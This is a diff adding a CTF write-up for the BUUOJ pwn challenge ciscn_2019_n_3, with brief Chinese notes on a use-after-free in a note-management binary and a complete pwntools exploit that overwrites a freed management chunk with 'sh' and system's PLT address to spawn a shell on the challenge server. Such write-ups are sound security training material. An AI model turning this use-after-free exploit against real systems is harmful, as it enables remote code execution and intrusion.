@@ -511,3 +511,64 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+
+### ciscn_2019_n_3
+
+先申请两个块看看，发现依然是 manage_chunk + user_chunk 的模式，manage_chunk 分别放着 0，manage_chunk大小，rec_str_print 地址，rec_str_free 地址（当申请类型是 text 时）
+
+简单看看 IDA，发现 new 函数没有什么溢出漏洞，但是 del 函数没有把头指针置空，而且 plt 表里面有 system，那么思路就比较明显，use after free，先申请 chunk_0 和 chunk_1，然后释放，再申请一个大小和 manage_chunk 一样大的，就可以控制 manage_chunk_0。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+host = "node5.buuoj.cn"
+port = 26565
+io = remote(host,port)
+# io = process("./ciscn_2019_n_3")
+elf = ELF("./ciscn_2019_n_3")
+system = elf.plt['system']
+
+def New(index,length,value):
+    io.recvuntil(b"CNote > ")
+    io.sendline(b'1')
+    io.recvuntil(b"Index > ")
+    io.sendline(str(index).encode())
+    io.recvuntil(b"Type > ")
+    io.sendline(b"2")   # Type > text(string)
+    io.recvuntil(b"Length > ")
+    io.sendline(str(length).encode())
+    io.recvuntil(b"Value > ")
+    io.sendline(value)
+
+def Del(index):
+    io.recvuntil(b"CNote > ")
+    io.sendline(b'2')
+    io.recvuntil(b"Index > ")
+    io.sendline(str(index).encode())
+
+def show(index):
+    io.recvuntil(b"CNote > ")
+    io.sendline(b'3')
+    io.recvuntil(b"Index > ")
+    io.sendline(str(index).encode())
+
+def main():
+    New(0,0x70,b'/bin/sh\x00')   # index 0
+    New(1,0x70,b'AAAA')   # index 1
+    New(2,0x70,b'BBBB')   # index 2 for guard
+    # gdb.attach(io)
+    Del(0)
+    Del(1)
+    payload_0 = b'sh\x00\x00' + p32(system)
+    New(3,12,payload_0)
+    # New(4,0x70,b'')
+    # gdb.attach(io)
+    Del(0)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
